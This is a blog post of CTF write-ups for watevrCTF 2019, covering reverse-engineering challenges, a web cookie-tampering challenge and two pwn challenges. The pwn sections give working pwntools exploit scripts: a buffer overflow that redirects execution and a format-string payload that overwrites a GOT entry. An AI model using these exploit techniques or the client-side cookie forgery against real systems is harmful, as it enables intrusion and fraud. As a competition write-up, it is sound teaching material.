---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "watevrCTF 2019 Writeups (Mainly Rev and Pwn)"
subtitle: "My writeups for the challenges I solved in the CTF. I mainly focused on Rev and Pwn categories."
authors: ["Shreyansh Singh"]

tags: [rev, pwn, misc, ctf, information security, infosec, writeups]
categories: [Information Security]
date: 2019-12-15T11:44:06+05:30
lastmod: 2019-12-15T11:44:06+05:30
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: "watevrCTF"
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, [Abs0lut3Pwn4g3](https://ctftime.org/team/72103). Our final rank was 54th.

---


# Rev Challeneges

## Timeout

File: [timeout](/post/2019-12-15_watevr-ctf-2019-writeups/files/timeout)

The binary is unstripped, so we can easily see the main function. The disassembly looks something like this. 

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_1.png" >}}

The functions, `signal`, `alarm` and `delay` all serve the same purpose, basically to either exit the program or delay its execution for a long time. We nop those out. So that our disassembly looks like this now. 

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/timeout_2.png" >}}

We see that there is a flag _can\_continnue_ which is set to 0x539, but not used in the code again. Checking the functions, we find one as `generate`, which uses this variable and generates the flag. Now solving this is simple using a debugger. Set a breakpoint before exiting and transfer execution to this function, using `set $rip = 0x4006a6`.

We get the flag - **watevr{3ncrytion_is_overrated_youtube.com/watch?v=OPf0YbXqDm0}**

&nbsp;  

## Hacking For Vodka

File: [vodka](/post/2019-12-15_watevr-ctf-2019-writeups/files/vodka)

The binary has different functionalities when run normally and when run in a debugger. We know this because of the *ptrace* call.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_1.png" >}}

I decide to analyse just the part which would have been evaded we were to run in a debugger, i.e the FUN_001012bf function. Inside that, there are a few more fuction calls and variables are set on stack. The intersesting part is the FUN_0010092a function.

Inside that function, which looks very complicated, there is an fgets call which is used to get our input and a strcmp to validate the input.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vodka_2.png" >}}

Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag :stuck_out_tongue:.

PS - Before the dynamic analysis, we patch the `PTRACE_TRACEME` call to jump to the required function.

The flag is - **watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}**

&nbsp;  

## esreveR

File: [esrever](/post/2019-12-15_watevr-ctf-2019-writeups/files/esrever)

This was a very fun challenge. When we open the binary, we see that the main function is heavily obfuscated. Not obfuscated in the true sense, but a lot is going on. For those using Ghidra, FUN_001018f3 is the main function. We see a lot of variables and a whole lot of precomputation. It is as late as in the 174th line that there is an fgets call to take our input. 

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_1.png" >}}

So, I set breakpoints at various places, to check what all is being computed. It is interesting that our input is used quite late in the code. It is used as a parameter to FUN_001012d8, which looks like something which will validate our input.

On checking that function, there is a call to another function FUN_00100ba0 with a large number of parameters, formed by basic bit manipulations (using XOR) with the precomputed values. Our input string is also sent with it. Then we check this function FUN_00100ba0. It has 57 parameters. And in this we see that our input is checked each of the remaining 56 parameters character wise. So, basically the 56 parameters is our flag.

Again, dynamic analysis was key here. 

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/reverse_2.png" >}}

Before the function call, the parameters are pushed onto the stack. We read these values by printing a larger number of values form `$ebp-0x10`.

Tha flag was - **watevr{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}**

&nbsp;  

## watshell

File: [watshell](/post/2019-12-15_watevr-ctf-2019-writeups/files/watshell)

In this problem, we have to send an input to the service, which will be decrypted, checked against a fixed string - "give_me_the_flag_please", and only then do we get the flag.

So, I started at the main function FUN_0010178b. Again like, the first problem, Timeout, there are a few inital timeout checks, which I patched. There is some precomputation being done before we enter our input.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_1.png" >}}

`strtok` is used here, which is used to split the string at some delimiter. And also, `atol` is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input "command" as space separated numbers.

We use dynamic analysis after we give our input, since all the precomputations are done, we don't have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of *10 11 12 13 14 15 16*, the following parameters are passed - 

```
0x5555555551af (
   $rdi = 0x00007fffffffd370 → 0x000000000000000a,
   $rsi = 0x0000000000000040,
   $rdx = 0x0000000000000000,
   $rcx = 0x00007fffffffd350 → 0x000000000000008f
)
```

i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array's pointer, with the first element as 0x8f.

Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3. 

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/watshell_2.png" >}}

The parameters passed are - 

```
0x555555554dc3 (
   $rdi = 0x000000000000000a,    // inp
   $rsi = 0x0000000000000071,    // arr_ele2
   $rdx = 0x000000000000008f,    // arr_ele1
   $rcx = 0x0000000000000071
)
```

i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.

This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.

```cpp
#include <bits/stdc++.h>

using namespace std;

long func(long inp, ulong arr_ele2, long mod) {
  long lVar1;
  
  if (((-1 < inp) && (-1 < (long)arr_ele2)) && (0 < mod)) {
    inp = inp % mod;
    if (arr_ele2 == 0) {
      lVar1 = 1;
    }
    else {
      lVar1 = inp;
      if (arr_ele2 != 1) {
        if ((arr_ele2 & 1) == 0) {
          lVar1 = (inp * inp) % mod;
          lVar1 = func(lVar1,(long)arr_ele2 / 2,mod);
          lVar1 = lVar1 % mod;
        }
        else {
          lVar1 = (long)((int)arr_ele2 - (int)((long)arr_ele2 >> 0x3f) & 1) + ((long)arr_ele2 >> 0x3f);
          if (lVar1 == 1) {
            lVar1 = func(inp,arr_ele2 - 1,mod);
            lVar1 = (lVar1 * inp) % mod;
          }
        }
      }
    }
    return lVar1;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}


int main() {
  map<int, int> m;
  for(int i=0; i<100000; i++) {
    long ans = func(i, 0x71, 0x8f);
    if(m.find((int)ans) == m.end())
      m[(int)ans] = i;
  }
  for(auto i: m) {
    cout<<i.first<<": "<<i.second<<endl;
  }
  string s = "give_me_the_flag_please";
  for(char c: s) {
    cout<<m[c]<<" ";
  }
  cout<<endl;
  return 0;
}
```

Now, what remains is to get the enoced values corresponding to "give_me_the_flag_please". The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.

The flag is - **watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}**

&nbsp;  

___

# Pwn Challenges

## Voting Machine 1

File: [kamikaze](/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze)

This is a buffer overflow challenge as gets has been used. There is a function `super_secret_function`. We basically have to jump there as it prints the flag. Pretty straightforward.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png" >}}

The offset of the crash is calculated using gef's pattern create and pattern search functionality.

My exploit code - 

```python
from pwn import *
# context.log_level = 'debug'
p = process("./kamikaze")
e = ELF('./kamikaze')
p = remote("13.48.67.196", 50000)

offset = 10

p.recvuntil(': ')

func = 0x0000000000400807

payload = "A"*offset
payload += p64(func)

p.sendline(payload)

with open('payload', 'wb') as f:
    f.write(payload)

p.interactive()
```

The flag is - **watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}**

&nbsp;  

## Voting Machine 2

File: [kamikaze2](/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2)

This binary had a format string vulnerability, since printf is being used without any format specifiers.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png" >}}

I played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with `%x`s. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).

After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.

The final exploit code is -

```python
from pwn import *
# context.log_level = 'debug'
p = process("./kamikaze2")
p = remote("13.53.125.206", 50000)

offset = 50
func = 0x08420736
main = 0x084207fb
exit_plt = 0x08422024

def pad(s):
	return s+"X"*(offset-len(s))

exploit = ""
exploit += "AA"
exploit += p32(exit_plt)
exploit += p32(exit_plt+2)
exploit += "BBBBCCCC"
exploit += "%8$1828x"
exploit += "%8$n"
exploit += "%65804x"
exploit += "%9$n"

print(pad(exploit))
payload = pad(exploit)

p.recvuntil(': ')

p.sendline(payload)

with open('payload', 'wb') as f:
    f.write(pad(exploit))

p.interactive()
```

The flag is - **watevr{GOT_som3_fl4g_for_you_https://www.youtube.com/watch?v=hYeFcSq7Mxg}**

---

# Other categories

## Misc - Unspaellablle

File: [orig.txt](/post/2019-12-15_watevr-ctf-2019-writeups/files/orig.txt)

We are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner & Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript. 

I found it at [IMSDb](https://www.imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html), and it was in the same format!!!

After this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.

{{< figure src="/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png" >}}


The flag is - **watevr{icantspeel_tiny.cc/2qtdez}**

&nbsp;

## Web - Cookie Store

Webpage - [http://13.48.71.231:50000/](http://13.48.71.231:50000/)

The page has a cookie - **eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==**, on decoding - **{"money": 50, "history": []}**.

We see that the *Flag* cookie is for 100$, so if we set the cookie to base64({"money": 200, "history": []}), i.e. **eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=**.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.

The flag is - **watevr{b64_15_4_6r347_3ncryp710n_m37h0d}**


---

That's all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn't solve. I will add my version of their writeups when I get to know their solution.

<script type="text/javascript" src="//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>

<!-- <button style="background-color: #70ab17; color: #1770AB" id="openpopup">Subscribe to my posts!</button> -->
<div class="button_cont" align="center"><a id="openpopup" class="example_a" rel="nofollow noopener">Subscribe to my posts!</a></div>

<style>
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
</style>


<script type="text/javascript">

function showMailingPopUp() {
    window.dojoRequire(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us4.list-manage.com","uuid":"0b10ac14f50d7f4e7d11cf26a","lid":"667a1bb3da","uniqueMethods":true}) })

    document.cookie = "MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC";
}

document.getElementById("openpopup").onclick = function() {showMailingPopUp()};

</script>

&nbsp;  

Follow me on [Twitter](https://twitter.com/shreyansh_26), [Github](https://github.com/shreyansh26) or connect on [LinkedIn](https://www.linkedin.com/in/shreyansh26/).
